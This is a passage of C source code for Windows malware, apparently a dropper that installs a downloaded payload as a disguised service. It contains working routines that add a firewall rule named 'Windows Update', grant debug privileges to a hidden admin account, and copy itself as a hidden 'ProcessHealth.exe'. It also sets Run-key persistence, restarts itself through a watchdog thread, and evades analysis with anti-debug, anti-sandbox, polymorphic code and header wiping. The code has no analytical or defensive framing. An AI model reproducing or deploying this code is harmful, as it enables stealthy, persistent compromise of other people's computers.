    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "netsh advfirewall firewall add rule name=\"Windows Update\" "
        "dir=out program=\"%s\" action=allow enable=yes profile=any "
        "service=wuauserv description=\"Windows Update Service\"",
        officePath
    );
    RunHiddenCommand(cmd);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\OfficeTemplates\\Parameters", 
        &hKey) == ERROR_SUCCESS) {
        const char* fakeName = "svchost.exe";
        RegSetValueExA(hKey, "ServiceDll", 0, REG_SZ, 
                      (const BYTE*)fakeName, strlen(fakeName)+1);
        RegCloseKey(hKey);
    }
    
    ExecutePolymorphicCode();
}

void AddDebugPrivileges() {
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "powershell -Command \"$sid = (New-Object System.Security.Principal.NTAccount('%s')).Translate([System.Security.Principal.SecurityIdentifier]).Value; "
        "secedit /export /cfg temp.inf; "
        "(Get-Content temp.inf) -replace 'SeDebugPrivilege = ', 'SeDebugPrivilege = $sid,' | Set-Content temp.inf; "
        "secedit /configure /db temp.sdb /cfg temp.inf; "
        "Remove-Item temp.inf, temp.sdb\"",
        g_adminAccount
    );
    RunHiddenCommand(cmd);
    
    char officePath[MAX_PATH] = {0};
    lstrcpyA(officePath, g_mallDir);
    SafePathAppend(officePath, "Microsoft@OfficeTempletes.exe", sizeof(officePath));
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "icacls \"%s\" /grant \"%s\":(F) /t",
        officePath, g_adminAccount
    );
    RunHiddenCommand(cmd);
    ExecutePolymorphicCode();
}

void SetupRegistryStartup() {
    char runKeyPath[MAX_PATH] = {0};
    memcpy(runKeyPath, g_runKeyPath, sizeof(g_runKeyPath));
    AesDecryptInPlace((BYTE*)runKeyPath, sizeof(g_runKeyPath));
    
    char runKeyName[MAX_PATH] = {0};
    memcpy(runKeyName, g_runKeyName, sizeof(g_runKeyName));
    AesDecryptInPlace((BYTE*)runKeyName, sizeof(g_runKeyName));
    
    HKEY hKey;
    // FIXED: Changed to HKEY_LOCAL_MACHINE for reliable persistence
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, runKeyPath, 0, NULL, 
                       REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        char backupPath[MAX_PATH] = {0};
        lstrcpyA(backupPath, g_backupDir);
        SafePathAppend(backupPath, "ProcessHealth.exe", sizeof(backupPath));
        
        RegSetValueExA(hKey, runKeyName, 0, REG_SZ, (BYTE*)backupPath, lstrlenA(backupPath)+1);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void RemoveRegistryStartup() {
    char runKeyPath[MAX_PATH] = {0};
    memcpy(runKeyPath, g_runKeyPath, sizeof(g_runKeyPath));
    AesDecryptInPlace((BYTE*)runKeyPath, sizeof(g_runKeyPath));
    
    char runKeyName[MAX_PATH] = {0};
    memcpy(runKeyName, g_runKeyName, sizeof(g_runKeyName));
    AesDecryptInPlace((BYTE*)runKeyName, sizeof(g_runKeyName));
    
    HKEY hKey;
    // FIXED: Changed to HKEY_LOCAL_MACHINE
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, runKeyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, runKeyName);
        RegCloseKey(hKey);
    }
    ExecutePolymorphicCode();
}

void SelfReplicate() {
    char currentPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char appDataPath[MAX_PATH] = {0};
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, appDataPath);
    
    srand(GetTickCount());
    char randomDir[32] = {0};
    sprintf_s(randomDir, sizeof(randomDir), "%08X", rand() ^ GetCurrentProcessId());
    
    lstrcpyA(g_backupDir, appDataPath);
    SafePathAppend(g_backupDir, "Microsoft\\Windows\\Caches", sizeof(g_backupDir));
    SafePathAppend(g_backupDir, randomDir, sizeof(g_backupDir));
    
    CreateDirectoryA(g_backupDir, NULL);
    SetFileAttributesA(g_backupDir, FILE_ATTRIBUTE_HIDDEN);
    
    char newPath[MAX_PATH] = {0};
    lstrcpyA(newPath, g_backupDir);
    SafePathAppend(newPath, "ProcessHealth.exe", sizeof(newPath));
    
    HANDLE hFile = CreateFileA(currentPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        ExecutePolymorphicCode();
        return;
    }
    CloseHandle(hFile);
    
    HANDLE hBackup = CreateFileA(newPath, GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hBackup == INVALID_HANDLE_VALUE) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        ExecutePolymorphicCode();
        return;
    }
    
    DWORD bytesWritten;
    WriteFile(hBackup, buffer, size, &bytesWritten, NULL);
    CloseHandle(hBackup);
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    HKEY hKey;
    if (RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MonitorPath", 0, REG_SZ, (BYTE*)g_backupDir, lstrlenA(g_backupDir)+1);
        RegCloseKey(hKey);
    }
    
    SetupRegistryStartup();
    ExecutePolymorphicCode();
}

DWORD WINAPI WatchdogThread(LPVOID lpParam) {
    char serviceName[MAX_PATH] = {0};
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName));
    
    while (1) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        BOOL processFound = FALSE;
        
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (lstrcmpiA(pe32.szExeFile, "Microsoft@OfficeTempletes.exe") == 0) {
                        processFound = TRUE;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        // Check service state if process not found
        if (!processFound) {
            if (!IsServiceRunning(serviceName)) {
                DWORD now = GetTickCount();
                // Attempt restart no more than once per hour
                if ((now - g_lastRestartAttempt) > 3600000) {
                    g_lastRestartAttempt = now;
                    DoFullSetup();
                }
            }
        }
        
        Sleep(WATCHDOG_INTERVAL);
    }
    return 0;
}

void TerminateRelatedProcesses() {
    const char* targets[] = {"Microsoft@OfficeTempletes.exe", "ProcessHealth.exe", "Hound.exe"};
    
    for (int i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) continue;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (lstrcmpiA(pe32.szExeFile, targets[i]) == 0 && 
                    pe32.th32ProcessID != GetCurrentProcessId()) {
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                    if (hProcess) {
                        TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    ExecutePolymorphicCode();
}

void DeleteInstallation() {
    char serviceName[MAX_PATH] = {0};
    memcpy(serviceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)serviceName, sizeof(g_serviceName));
    
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, 
        "powershell -Command \"$s = New-Object System.ServiceProcess.ServiceController('%s');"
        "$s.Stop(); $s.WaitForStatus('Stopped', [TimeSpan]::FromSeconds(30));\"",
        serviceName
    );
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "sc delete \"%s\"", serviceName);
    RunHiddenCommand(cmd);
    
    char houndServiceName[MAX_PATH] = {0};
    memcpy(houndServiceName, g_houndServiceName, sizeof(g_houndServiceName));
    AesDecryptInPlace((BYTE*)houndServiceName, sizeof(g_houndServiceName));
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, 
        "powershell -Command \"$s = New-Object System.ServiceProcess.ServiceController('%s');"
        "$s.Stop(); $s.WaitForStatus('Stopped', [TimeSpan]::FromSeconds(30));\"",
        houndServiceName
    );
    RunHiddenCommand(cmd);
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "sc delete \"%s\"", houndServiceName);
    RunHiddenCommand(cmd);
    
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "cmd.exe /c rmdir /s /q \"%s\"", g_mallDir);
    RunHiddenCommand(cmd);
    
    HKEY hKey;
    if (RegOpenKeyA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\OfficeTemplates", &hKey) == ERROR_SUCCESS) {
        RegDeleteTreeA(hKey, NULL);
        RegCloseKey(hKey);
    }
    
    RemoveRegistryStartup();
    ExecutePolymorphicCode();
}

void RunBackupInstance() {
    HKEY hKey;
    char backupDir[MAX_PATH] = {0};
    DWORD bufSize = MAX_PATH;
    
    if (RegOpenKeyA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Health", &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "MonitorPath", NULL, NULL, (LPBYTE)backupDir, &bufSize);
        RegCloseKey(hKey);
    }
    
    if (lstrlenA(backupDir) == 0) {
        ExecutePolymorphicCode();
        return;
    }
    
    char backupPath[MAX_PATH] = {0};
    lstrcpyA(backupPath, backupDir);
    SafePathAppend(backupPath, "ProcessHealth.exe", sizeof(backupPath));
    
    if (GetFileAttributesA(backupPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[MAX_BUF] = {0};
    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE, "\"%s\"", backupPath);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExecutePolymorphicCode();
}

void StartWatchdog() {
    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);
}

void WipeHeaders(PIMAGE_DOS_HEADER dos, PIMAGE_NT_HEADERS nt) {
    DWORD oldProtect;
    if (VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldProtect)) {
        memset(dos, 0, nt->OptionalHeader.SizeOfHeaders);
        VirtualProtect(dos, nt->OptionalHeader.SizeOfHeaders, oldProtect, &oldProtect);
    }
}

void DoFullSetup() {
    CreateAdminAccount();
    if (g_accountCreated) {
        HideAdminAccount();
    }
    
    CreateMallDirectory();
    DownloadAndExtractMall();
    RunBypassScript();
    TakeOwnership(g_mallDir);
    InstallNSSM();
    ConfigureOfficeService();
    ConfigureHoundService();
    SetupNetworkMasking();
    AddDebugPrivileges();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char moduleName[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, moduleName, MAX_PATH);
    PathStripPathA(moduleName);
    g_isBackupInstance = (lstrcmpiA(moduleName, "ProcessHealth.exe") == 0);
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        ExitProcess(1);
    }
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dos + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        ExitProcess(1);
    }
    
    AntiDebug();
    AntiSandbox();
    RandomSleep(3000, 2000);
    
    my_srand(GetTickCount());
    MorphCode();
    WipeHeaders(dos, nt);

    char decryptedServiceName[MAX_PATH] = {0};
    memcpy(decryptedServiceName, g_serviceName, sizeof(g_serviceName));
    AesDecryptInPlace((BYTE*)decryptedServiceName, sizeof(g_serviceName));

    if (!g_isBackupInstance) {
        DoFullSetup();
        SelfReplicate();
        RunBackupInstance();
        ExitProcess(0);
    } else {
        if (!IsServiceRunning(decryptedServiceName)) {
            DoFullSetup();
        }
        StartWatchdog();
        while (1) {
            Sleep(10000);
            ExecutePolymorphicCode();
        }
    }
    
    return 0;
}